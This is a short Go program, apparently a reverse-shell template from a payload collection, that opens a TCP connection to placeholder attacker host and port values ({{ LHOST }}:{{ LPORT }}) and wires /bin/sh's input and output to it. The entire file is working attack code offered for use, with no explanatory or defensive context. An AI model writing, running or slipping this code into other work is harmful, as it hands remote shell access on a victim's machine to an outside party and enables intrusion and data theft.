package main

import "os/exec"
import"net"

// go run ./shell.go

func main() {
    c,_:=net.Dial("tcp","{{ LHOST }}:{{ LPORT }}")
    cmd:=exec.Command("/bin/sh")
    cmd.Stdin=c
    cmd.Stdout=c
    cmd.Stderr=c
    cmd.Run()
}
